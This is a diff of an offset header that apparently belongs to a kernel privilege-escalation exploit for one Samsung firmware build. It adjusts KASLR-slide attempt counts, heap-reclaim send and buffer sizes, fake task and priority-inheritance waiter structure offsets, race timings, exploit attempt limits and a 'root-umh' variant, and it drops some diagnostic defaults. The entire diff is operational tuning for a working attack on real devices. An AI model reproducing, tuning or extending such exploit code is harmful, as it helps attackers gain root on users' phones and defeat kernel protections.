@@ -1,14 +1,11 @@
 #ifndef OFFSET_H
 #define OFFSET_H
 
-#include <stddef.h>
-#include <stdint.h>
-
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL \
   "r12s-S721BXXSCDZF3-app-production-slide8-fops8"
 #define APP_PHYS_P0_ORACLE 1
-#define APP_REQUIRE_FRESH_P0_SESSION 0
+#define APP_REQUIRE_FRESH_P0_SESSION 1
 #define APP_FOPS_DATA_ALIAS_DIAG_ONLY 1
 #define APP_FOPS_DATA_ALIAS_GATE_VERIFY 1
 #define APP_FOPS_REUSE_VERIFIED_PAGE 1
@@ -25,7 +22,6 @@
 #define APP_DEFER_ALL_DRAIN_REAPS 1
 #define APP_ACCEPT_SCHED_TRIGGER 1
 #define APP_PSELECT_POST_GUARD_AGE_CHECK 1
-#define APP_TRACEFS_KASLR_DIRECT 1
 #else
 #define BUILD_VARIANT_LABEL "r12s-S721BXXSCDZF3-root-umh"
 #endif
@@ -68,6 +64,20 @@
 #define SLIDE_MAX_ATTEMPTS 32
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8
+#define APP_SLIDE_FRESH_PAGE_ATTEMPTS 8
+#define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
+#define APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES 16
+#define APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES 16
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
+#define APP_SLIDE_RECLAIM_SENDS 192
+#define APP_SLIDE_RECLAIM_SNDBUF 16777216
+#define APP_MM_LATE_DRAIN_TRIGGERS 2
+#define APP_SLIDE_MIN_OBJECT_INDEX 27
+#define APP_SLIDE_MAX_OBJECT_INDEX 30
+#define APP_FOPS_MIN_OBJECT_INDEX 12
+#define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000ULL
+#define APP_FOPS_PSELECT_DELAY_USEC 50000
 #define ROUTE_WAIT_SECONDS 8
 #define PSELECT_ENTER_DELAY_USEC 50000
 #define SLIDE_PSELECT_TIMEOUT_NSEC 500000000L
@@ -77,7 +87,6 @@
 #define SLIDE_SYNC_PSELECT_SYSCALL 1
 #define SLIDE_GUARD_PSELECT_SYSCALL 1
 #define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
-#define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
 #define DEFAULT_EXPLOIT_ATTEMPTS 24
 #define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
 #define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
@@ -100,17 +109,6 @@
 #define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
 #define P0_FINGERPRINT_HEADER \
   "targets/r12s-S721BXXSCDZF3/p0_fingerprint.h"
-
-/* Preserve the original diagnostic defaults when the fresh-session block is disabled. */
-#if !defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION
-static int ready_ok __attribute__((unused)) = -1;
-static int guard_ok __attribute__((unused)) = -1;
-static size_t ready_elapsed_usec __attribute__((unused)) = 0;
-static size_t guard_elapsed_usec __attribute__((unused)) = 0;
-static uint64_t pselect_age_usec __attribute__((unused)) = 0;
-static char ready_wchan[64] __attribute__((unused)) = "<not-read>";
-static char guard_wchan[64] __attribute__((unused)) = "<not-read>";
-#endif
 #endif
 
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
@@ -193,6 +191,7 @@ static char guard_wchan[64] __attribute__((unused)) = "<not-read>";
 #define RIGHT_OFF 0x4440
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
+
 
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
 #define FAKE_WAITER_TASK_OFF 0x30
